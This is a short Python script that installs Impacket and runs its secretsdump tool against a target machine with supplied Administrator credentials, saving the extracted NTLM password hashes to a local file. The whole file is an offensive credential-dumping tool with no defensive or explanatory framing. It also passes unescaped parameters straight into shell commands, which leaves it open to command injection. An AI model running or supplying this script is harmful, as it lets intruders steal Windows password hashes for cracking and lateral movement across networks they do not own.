import os

def dump_ntlm_hashes(target_ip, username, password):
    # Ensure Impacket is installed
    try:
        os.system(f"pip install impacket")
    except Exception as e:
        print(f"Error installing Impacket: {e}")
        return
    
    # Run secretsdump.py from Impacket
    command = f"secretsdump.py {username}:{password}@{target_ip} > ntlm_hashes.txt"
    os.system(command)
    print("NTLM hashes dumped successfully. Check ntlm_hashes.txt")

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with target IP
    username = "Administrator"   # Replace with valid username
    password = "password123"     # Replace with valid password
    
    dump_ntlm_hashes(target_ip, username, password)
